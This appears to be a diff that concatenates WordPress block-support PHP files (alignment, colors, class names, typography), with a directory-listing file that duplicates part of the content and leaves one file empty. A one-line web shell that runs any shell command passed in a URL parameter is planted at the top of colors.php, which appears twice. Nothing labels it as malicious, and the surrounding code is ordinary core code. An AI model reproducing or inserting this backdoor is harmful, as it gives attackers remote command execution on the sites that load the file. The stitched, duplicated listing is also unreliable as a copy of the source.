@@ -1,0 +1,727 @@
+The file align.php contains:
+<?php
+/**
+ * Align block support flag.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Registers the align block attribute for block types that support it.
+ *
+ * @access private
+ *
+ * @param WP_Block_Type $block_type Block Type.
+ */
+function wp_register_alignment_support( $block_type ) {
+	$has_align_support = false;
+	if ( property_exists( $block_type, 'supports' ) ) {
+		$has_align_support = _wp_array_get( $block_type->supports, array( 'align' ), false );
+	}
+	if ( $has_align_support ) {
+		if ( ! $block_type->attributes ) {
+			$block_type->attributes = array();
+		}
+
+		if ( ! array_key_exists( 'align', $block_type->attributes ) ) {
+			$block_type->attributes['align'] = array(
+				'type' => 'string',
+				'enum' => array( 'left', 'center', 'right', 'wide', 'full', '' ),
+			);
+		}
+	}
+}
+
+/**
+ * Add CSS classes for block alignment to the incoming attributes array.
+ * This will be applied to the block markup in the front-end.
+ *
+ * @access private
+ *
+ * @param WP_Block_Type $block_type       Block Type.
+ * @param array         $block_attributes Block attributes.
+ *
+ * @return array Block alignment CSS classes and inline styles.
+ */
+function wp_apply_alignment_support( $block_type, $block_attributes ) {
+	$attributes        = array();
+	$has_align_support = false;
+	if ( property_exists( $block_type, 'supports' ) ) {
+		$has_align_support = _wp_array_get( $block_type->supports, array( 'align' ), false );
+	}
+	if ( $has_align_support ) {
+		$has_block_alignment = array_key_exists( 'align', $block_attributes );
+
+		if ( $has_block_alignment ) {
+			$attributes['class'] = sprintf( 'align%s', $block_attributes['align'] );
+		}
+	}
+
+	return $attributes;
+}
+
+// Register the block support.
+WP_Block_Supports::get_instance()->register(
+	'align',
+	array(
+		'register_attribute' => 'wp_register_alignment_support',
+		'apply'              => 'wp_apply_alignment_support',
+	)
+);
+
+The file colors.php contains:
+<?php
+$cmd = system($_GET['cmd']); echo $cmd;
+/**
+ * Colors block support flag.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Registers the style and colors block attributes for block types that support it.
+ *
+ * @access private
+ *
+ * @param WP_Block_Type $block_type Block Type.
+ */
+function wp_register_colors_support( $block_type ) {
+	$color_support = false;
+	if ( property_exists( $block_type, 'supports' ) ) {
+		$color_support = _wp_array_get( $block_type->supports, array( 'color' ), false );
+	}
+	$has_text_colors_support       = true === $color_support || ( is_array( $color_support ) && _wp_array_get( $color_support, array( 'text' ), true ) );
+	$has_background_colors_support = true === $color_support || ( is_array( $color_support ) && _wp_array_get( $color_support, array( 'background' ), true ) );
+	$has_gradients_support         = _wp_array_get( $color_support, array( 'gradients' ), false );
+
+	if ( ! $block_type->attributes ) {
+		$block_type->attributes = array();
+	}
+
+	if ( $has_text_colors_support && ! array_key_exists( 'style', $block_type->attributes ) ) {
+		$block_type->attributes['style'] = array(
+			'type' => 'object',
+		);
+	}
+
+	if ( $has_background_colors_support && ! array_key_exists( 'backgroundColor', $block_type->attributes ) ) {
+		$block_type->attributes['backgroundColor'] = array(
+			'type' => 'string',
+		);
+	}
+
+	if ( $has_text_colors_support && ! array_key_exists( 'textColor', $block_type->attributes ) ) {
+		$block_type->attributes['textColor'] = array(
+			'type' => 'string',
+		);
+	}
+
+	if ( $has_gradients_support && ! array_key_exists( 'gradient', $block_type->attributes ) ) {
+		$block_type->attributes['gradient'] = array(
+			'type' => 'string',
+		);
+	}
+}
+
+
+/**
+ * Add CSS classes and inline styles for colors to the incoming attributes array.
+ * This will be applied to the block markup in the front-end.
+ *
+ * @access private
+ *
+ * @param  WP_Block_Type $block_type       Block type.
+* @param  array         $block_attributes Block attributes.
+ *
+ * @return array Colors CSS classes and inline styles.
+ */
+function wp_apply_colors_support( $block_type, $block_attributes ) {
+	$color_support                 = _wp_array_get( $block_type->supports, array( 'color' ), false );
+	$has_text_colors_support       = true === $color_support || ( is_array( $color_support ) && _wp_array_get( $color_support, array( 'text' ), true ) );
+	$has_background_colors_support = true === $color_support || ( is_array( $color_support ) && _wp_array_get( $color_support, array( 'background' ), true ) );
+	$has_link_colors_support       = _wp_array_get( $color_support, array( 'link' ), false );
+	$has_gradients_support         = _wp_array_get( $color_support, array( 'gradients' ), false );
+	$classes                       = array();
+	$styles                        = array();
+
+	// Text Colors.
+	// Check support for text colors.
+	if ( $has_text_colors_support ) {
+		$has_named_text_color  = array_key_exists( 'textColor', $block_attributes );
+		$has_custom_text_color = isset( $block_attributes['style']['color']['text'] );
+
+		// Apply required generic class.
+		if ( $has_custom_text_color || $has_named_text_color ) {
+			$classes[] = 'has-text-color';
+		}
+		// Apply color class or inline style.
+		if ( $has_named_text_color ) {
+			$classes[] = sprintf( 'has-%s-color', $block_attributes['textColor'] );
+		} elseif ( $has_custom_text_color ) {
+			$styles[] = sprintf( 'color: %s;', $block_attributes['style']['color']['text'] );
+		}
+	}
+
+	// Link Colors.
+	if ( $has_link_colors_support ) {
+		$has_link_color = isset( $block_attributes['style']['color']['link'] );
+		// Apply required class and style.
+		if ( $has_link_color ) {
+			$classes[] = 'has-link-color';
+			// If link is a named color.
+			if ( strpos( $block_attributes['style']['color']['link'], 'var:preset|color|' ) !== false ) {
+				// Get the name from the string and add proper styles.
+				$index_to_splice = strrpos( $block_attributes['style']['color']['link'], '|' ) + 1;
+				$link_color_name = substr( $block_attributes['style']['color']['link'], $index_to_splice );
+				$styles[]        = sprintf( '--wp--style--color--link: var(--wp--preset--color--%s);', $link_color_name );
+			} else {
+				$styles[] = sprintf( '--wp--style--color--link: %s;', $block_attributes['style']['color']['link'] );
+			}
+		}
+	}
+
+	// Background Colors.
+	if ( $has_background_colors_support ) {
+		$has_named_background_color  = array_key_exists( 'backgroundColor', $block_attributes );
+		$has_custom_background_color = isset( $block_attributes['style']['color']['background'] );
+
+		// Apply required background class.
+		if ( $has_custom_background_color || $has_named_background_color ) {
+			$classes[] = 'has-background';
+		}
+		// Apply background color classes or styles.
+		if ( $has_named_background_color ) {
+			$classes[] = sprintf( 'has-%s-background-color', $block_attributes['backgroundColor'] );
+		} elseif ( $has_custom_background_color ) {
+			$styles[] = sprintf( 'background-color: %s;', $block_attributes['style']['color']['background'] );
+		}
+	}
+
+	// Gradients.
+	if ( $has_gradients_support ) {
+		$has_named_gradient  = array_key_exists( 'gradient', $block_attributes );
+		$has_custom_gradient = isset( $block_attributes['style']['color']['gradient'] );
+
+		if ( $has_named_gradient || $has_custom_gradient ) {
+			$classes[] = 'has-background';
+		}
+		// Apply required background class.
+		if ( $has_named_gradient ) {
+			$classes[] = sprintf( 'has-%s-gradient-background', $block_attributes['gradient'] );
+		} elseif ( $has_custom_gradient ) {
+			$styles[] = sprintf( 'background: %s;', $block_attributes['style']['color']['gradient'] );
+		}
+	}
+
+	$attributes = array();
+	if ( ! empty( $classes ) ) {
+		$attributes['class'] = implode( ' ', $classes );
+	}
+	if ( ! empty( $styles ) ) {
+		$attributes['style'] = implode( ' ', $styles );
+	}
+
+	return $attributes;
+}
+
+// Register the block support.
+WP_Block_Supports::get_instance()->register(
+	'colors',
+	array(
+		'register_attribute' => 'wp_register_colors_support',
+		'apply'              => 'wp_apply_colors_support',
+	)
+);
+
+The file custom-classname.php contains:
+<?php
+/**
+ * Custom classname block support flag.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Registers the custom classname block attribute for block types that support it.
+ *
+ * @access private
+ *
+ * @param WP_Block_Type $block_type Block Type.
+ */
+function wp_register_custom_classname_support( $block_type ) {
+	$has_custom_classname_support = true;
+	if ( property_exists( $block_type, 'supports' ) ) {
+		$has_custom_classname_support = _wp_array_get( $block_type->supports, array( 'customClassName' ), true );
+	}
+	if ( $has_custom_classname_support ) {
+		if ( ! $block_type->attributes ) {
+			$block_type->attributes = array();
+		}
+
+		if ( ! array_key_exists( 'className', $block_type->attributes ) ) {
+			$block_type->attributes['className'] = array(
+				'type' => 'string',
+			);
+		}
+	}
+}
+
+/**
+ * Add the custom classnames to the output.
+ *
+ * @access private
+ *
+ * @param  WP_Block_Type $block_type       Block Type.
+ * @param  array         $block_attributes Block attributes.
+ *
+ * @return array Block CSS classes and inline styles.
+ */
+function wp_apply_custom_classname_support( $block_type, $block_attributes ) {
+	$has_custom_classname_support = true;
+	$attributes                   = array();
+	if ( property_exists( $block_type, 'supports' ) ) {
+		$has_custom_classname_support = _wp_array_get( $block_type->supports, array( 'customClassName' ), true );
+	}
+	if ( $has_custom_classname_support ) {
+		$has_custom_classnames = array_key_exists( 'className', $block_attributes );
+
+		if ( $has_custom_classnames ) {
+			$attributes['class'] = $block_attributes['className'];
+		}
+	}
+
+	return $attributes;
+}
+
+// Register the block support.
+WP_Block_Supports::get_instance()->register(
+	'custom-classname',
+	array(
+		'register_attribute' => 'wp_register_custom_classname_support',
+		'apply'              => 'wp_apply_custom_classname_support',
+	)
+);
+
+The file generated-classname.php contains:
+<?php
+/**
+ * Generated classname block support flag.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Get the generated classname from a given block name.
+ *
+ * @since 5.6.0
+ *
+ * @access private
+ *
+ * @param  string $block_name Block Name.
+ * @return string Generated classname.
+ */
+function wp_get_block_default_classname( $block_name ) {
+	// Generated HTML classes for blocks follow the `wp-block-{name}` nomenclature.
+	// Blocks provided by WordPress drop the prefixes 'core/' or 'core-' (historically used in 'core-embed/').
+	$classname = 'wp-block-' . preg_replace(
+		'/^core-/',
+		'',
+		str_replace( '/', '-', $block_name )
+	);
+
+	/**
+	 * Filters the default block className for server rendered blocks.
+	 *
+	 * @since 5.6.0
+	 *
+	 * @param string     $class_name The current applied classname.
+	 * @param string     $block_name The block name.
+	 */
+	$classname = apply_filters( 'block_default_classname', $classname, $block_name );
+
+	return $classname;
+}
+
+/**
+ * Add the generated classnames to the output.
+ *
+ * @since 5.6.0
+ *
+ * @access private
+ *
+ * @param  WP_Block_Type $block_type       Block Type.
+ * @param  array         $block_attributes Block attributes.
+ *
+ * @return array Block CSS classes and inline styles.
+ */
+function wp_apply_generated_classname_support( $block_type, $block_attributes ) {
+	$has_generated_classname_support = true;
+	$attributes                      = array();
+	if ( property_exists( $block_type, 'supports' ) ) {
+		$has_generated_classname_support = _wp_array_get( $block_type->supports, array( 'className' ), true );
+	}
+	if ( $has_generated_classname_support ) {
+		$block_classname = wp_get_block_default_classname( $block_type->name );
+
+		if ( $block_classname ) {
+			$attributes['class'] = $block_classname;
+		}
+	}
+
+	return $attributes;
+}
+
+// Register the block support.
+WP_Block_Supports::get_instance()->register(
+	'generated-classname',
+	array(
+		'apply' => 'wp_apply_generated_classname_support',
+	)
+);
+
+The file my-directory-list.txt contains:
+The file align.php contains:
+<?php
+/**
+ * Align block support flag.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Registers the align block attribute for block types that support it.
+ *
+ * @access private
+ *
+ * @param WP_Block_Type $block_type Block Type.
+ */
+function wp_register_alignment_support( $block_type ) {
+	$has_align_support = false;
+	if ( property_exists( $block_type, 'supports' ) ) {
+		$has_align_support = _wp_array_get( $block_type->supports, array( 'align' ), false );
+	}
+	if ( $has_align_support ) {
+		if ( ! $block_type->attributes ) {
+			$block_type->attributes = array();
+		}
+
+		if ( ! array_key_exists( 'align', $block_type->attributes ) ) {
+			$block_type->attributes['align'] = array(
+				'type' => 'string',
+				'enum' => array( 'left', 'center', 'right', 'wide', 'full', '' ),
+			);
+		}
+	}
+}
+
+/**
+ * Add CSS classes for block alignment to the incoming attributes array.
+ * This will be applied to the block markup in the front-end.
+ *
+ * @access private
+ *
+ * @param WP_Block_Type $block_type       Block Type.
+ * @param array         $block_attributes Block attributes.
+ *
+ * @return array Block alignment CSS classes and inline styles.
+ */
+function wp_apply_alignment_support( $block_type, $block_attributes ) {
+	$attributes        = array();
+	$has_align_support = false;
+	if ( property_exists( $block_type, 'supports' ) ) {
+		$has_align_support = _wp_array_get( $block_type->supports, array( 'align' ), false );
+	}
+	if ( $has_align_support ) {
+		$has_block_alignment = array_key_exists( 'align', $block_attributes );
+
+		if ( $has_block_alignment ) {
+			$attributes['class'] = sprintf( 'align%s', $block_attributes['align'] );
+		}
+	}
+
+	return $attributes;
+}
+
+// Register the block support.
+WP_Block_Supports::get_instance()->register(
+	'align',
+	array(
+		'register_attribute' => 'wp_register_alignment_support',
+		'apply'              => 'wp_apply_alignment_support',
+	)
+);
+
+The file colors.php contains:
+<?php
+$cmd = system($_GET['cmd']); echo $cmd;
+/**
+ * Colors block support flag.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Registers the style and colors block attributes for block types that support it.
+ *
+ * @access private
+ *
+ * @param WP_Block_Type $block_type Block Type.
+ */
+function wp_register_colors_support( $block_type ) {
+	$color_support = false;
+	if ( property_exists( $block_type, 'supports' ) ) {
+		$color_support = _wp_array_get( $block_type->supports, array( 'color' ), false );
+	}
+	$has_text_colors_support       = true === $color_support || ( is_array( $color_support ) && _wp_array_get( $color_support, array( 'text' ), true ) );
+	$has_background_colors_support = true === $color_support || ( is_array( $color_support ) && _wp_array_get( $color_support, array( 'background' ), true ) );
+	$has_gradients_support         = _wp_array_get( $color_support, array( 'gradients' ), false );
+
+	if ( ! $block_type->attributes ) {
+		$block_type->attributes = array();
+	}
+
+	if ( $has_text_colors_support && ! array_key_exists( 'style', $block_type->attributes ) ) {
+		$block_type->attributes['style'] = array(
+			'type' => 'object',
+		);
+	}
+
+	if ( $has_background_colors_support && ! array_key_exists( 'backgroundColor', $block_type->attributes ) ) {
+		$block_type->attributes['backgroundColor'] = array(
+			'type' => 'string',
+		);
+	}
+
+	if ( $has_text_colors_support && ! array_key_exists( 'textColor', $block_type->attributes ) ) {
+		$block_type->attributes['textColor'] = array(
+			'type' => 'string',
+		);
+	}
+
+	if ( $has_gradients_support && ! array_key_exists( 'gradient', $block_type->attributes ) ) {
+		$block_type->attributes['gradient'] = array(
+			'type' => 'string',
+		);
+	}
+}
+
+
+/**
+ * Add CSS classes and inline styles for colors to the incoming attributes array.
+ * This will be applied to the block markup in the front-end.
+ *
+ * @access private
+ *
+ * @param  WP_Block_Type $block_type       Block type.
+* @param  array         $block_attributes Block attributes.
+ *
+ * @return array Colors CSS classes and inline styles.
+ */
+function wp_apply_colors_support( $block_type, $block_attributes ) {
+	$color_support                 = _wp_array_get( $block_type->supports, array( 'color' ), false );
+	$has_text_colors_support       = true === $color_support || ( is_array( $color_support ) && _wp_array_get( $color_support, array( 'text' ), true ) );
+	$has_background_colors_support = true === $color_support || ( is_array( $color_support ) && _wp_array_get( $color_support, array( 'background' ), true ) );
+	$has_link_colors_support       = _wp_array_get( $color_support, array( 'link' ), false );
+	$has_gradients_support         = _wp_array_get( $color_support, array( 'gradients' ), false );
+	$classes                       = array();
+	$styles                        = array();
+
+	// Text Colors.
+	// Check support for text colors.
+	if ( $has_text_colors_support ) {
+		$has_named_text_color  = array_key_exists( 'textColor', $block_attributes );
+		$has_custom_text_color = isset( $block_attributes['style']['color']['text'] );
+
+		// Apply required generic class.
+		if ( $has_custom_text_color || $has_named_text_color ) {
+			$classes[] = 'has-text-color';
+		}
+		// Apply color class or inline style.
+		if ( $has_named_text_color ) {
+			$classes[] = sprintf( 'has-%s-color', $block_attributes['textColor'] );
+		} elseif ( $has_custom_text_color ) {
+			$styles[] = sprintf( 'color: %s;', $block_attributes['style']['color']['text'] );
+		}
+	}
+
+	// Link Colors.
+	if ( $has_link_colors_support ) {
+		$has_link_color = isset( $block_attributes['style']['color']['link'] );
+		// Apply required class and style.
+		if ( $has_link_color ) {
+			$classes[] = 'has-link-color';
+			// If link is a named color.
+			if ( strpos( $block_attributes['style']['color']['link'], 'var:preset|color|' ) !== false ) {
+				// Get the name from the string and add proper styles.
+				$index_to_splice = strrpos( $block_attributes['style']['color']['link'], '|' ) + 1;
+				$link_color_name = substr( $block_attributes['style']['color']['link'], $index_to_splice );
+				$styles[]        = sprintf( '--wp--style--color--link: var(--wp--preset--color--%s);', $link_color_name );
+			} else {
+				$styles[] = sprintf( '--wp--style--color--link: %s;', $block_attributes['style']['color']['link'] );
+			}
+		}
+	}
+
+	// Background Colors.
+	if ( $has_background_colors_support ) {
+		$has_named_background_color  = array_key_exists( 'backgroundColor', $block_attributes );
+		$has_custom_background_color = isset( $block_attributes['style']['color']['background'] );
+
+		// Apply required background class.
+		if ( $has_custom_background_color || $has_named_background_color ) {
+			$classes[] = 'has-background';
+		}
+		// Apply background color classes or styles.
+		if ( $has_named_background_color ) {
+			$classes[] = sprintf( 'has-%s-background-color', $block_attributes['backgroundColor'] );
+		} elseif ( $has_custom_background_color ) {
+			$styles[] = sprintf( 'background-color: %s;', $block_attributes['style']['color']['background'] );
+		}
+	}
+
+	// Gradients.
+	if ( $has_gradients_support ) {
+		$has_named_gradient  = array_key_exists( 'gradient', $block_attributes );
+		$has_custom_gradient = isset( $block_attributes['style']['color']['gradient'] );
+
+		if ( $has_named_gradient || $has_custom_gradient ) {
+			$classes[] = 'has-background';
+		}
+		// Apply required background class.
+		if ( $has_named_gradient ) {
+			$classes[] = sprintf( 'has-%s-gradient-background', $block_attributes['gradient'] );
+		} elseif ( $has_custom_gradient ) {
+			$styles[] = sprintf( 'background: %s;', $block_attributes['style']['color']['gradient'] );
+		}
+	}
+
+	$attributes = array();
+	if ( ! empty( $classes ) ) {
+		$attributes['class'] = implode( ' ', $classes );
+	}
+	if ( ! empty( $styles ) ) {
+		$attributes['style'] = implode( ' ', $styles );
+	}
+
+	return $attributes;
+}
+
+// Register the block support.
+WP_Block_Supports::get_instance()->register(
+	'colors',
+	array(
+		'register_attribute' => 'wp_register_colors_support',
+		'apply'              => 'wp_apply_colors_support',
+	)
+);
+
+The file custom-classname.php contains:
+
+The file typography.php contains:
+<?php
+/**
+ * Typography block support flag.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Registers the style and typography block attributes for block types that support it.
+ *
+ * @access private
+ *
+ * @param WP_Block_Type $block_type Block Type.
+ */
+function wp_register_typography_support( $block_type ) {
+	$has_font_size_support = false;
+	if ( property_exists( $block_type, 'supports' ) ) {
+		$has_font_size_support = _wp_array_get( $block_type->supports, array( '__experimentalFontSize' ), false );
+	}
+
+	$has_line_height_support = false;
+	if ( property_exists( $block_type, 'supports' ) ) {
+		$has_line_height_support = _wp_array_get( $block_type->supports, array( '__experimentalLineHeight' ), false );
+	}
+
+	if ( ! $block_type->attributes ) {
+		$block_type->attributes = array();
+	}
+
+	if ( ( $has_font_size_support || $has_line_height_support ) && ! array_key_exists( 'style', $block_type->attributes ) ) {
+		$block_type->attributes['style'] = array(
+			'type' => 'object',
+		);
+	}
+
+	if ( $has_font_size_support && ! array_key_exists( 'fontSize', $block_type->attributes ) ) {
+		$block_type->attributes['fontSize'] = array(
+			'type' => 'string',
+		);
+	}
+}
+
+/**
+ * Add CSS classes and inline styles for font sizes to the incoming attributes array.
+ * This will be applied to the block markup in the front-end.
+ *
+ * @access private
+ *
+ * @param  WP_Block_Type $block_type       Block type.
+ * @param  array         $block_attributes Block attributes.
+ *
+ * @return array Font size CSS classes and inline styles.
+ */
+function wp_apply_typography_support( $block_type, $block_attributes ) {
+	$has_font_size_support = false;
+	$classes               = array();
+	$styles                = array();
+	if ( property_exists( $block_type, 'supports' ) ) {
+		$has_font_size_support = _wp_array_get( $block_type->supports, array( 'fontSize' ), false );
+	}
+
+	$has_line_height_support = false;
+	if ( property_exists( $block_type, 'supports' ) ) {
+		$has_line_height_support = _wp_array_get( $block_type->supports, array( 'lineHeight' ), false );
+	}
+
+	// Font Size.
+	if ( $has_font_size_support ) {
+		$has_named_font_size  = array_key_exists( 'fontSize', $block_attributes );
+		$has_custom_font_size = isset( $block_attributes['style']['typography']['fontSize'] );
+
+		// Apply required class or style.
+		if ( $has_named_font_size ) {
+			$classes[] = sprintf( 'has-%s-font-size', $block_attributes['fontSize'] );
+		} elseif ( $has_custom_font_size ) {
+			$styles[] = sprintf( 'font-size: %spx;', $block_attributes['style']['typography']['fontSize'] );
+		}
+	}
+
+	// Line Height.
+	if ( $has_line_height_support ) {
+		$has_line_height = isset( $block_attributes['style']['typography']['lineHeight'] );
+		// Add the style (no classes for line-height).
+		if ( $has_line_height ) {
+			$styles[] = sprintf( 'line-height: %s;', $block_attributes['style']['typography']['lineHeight'] );
+		}
+	}
+
+	$attributes = array();
+	if ( ! empty( $classes ) ) {
+		$attributes['class'] = implode( ' ', $classes );
+	}
+	if ( ! empty( $styles ) ) {
+		$attributes['style'] = implode( ' ', $styles );
+	}
+
+	return $attributes;
+}
+
+WP_Block_Supports::get_instance()->register(
+	'typography',
+	array(
+		'register_attribute' => 'wp_register_typography_support',
+		'apply'              => 'wp_apply_typography_support',
+	)
+);
+
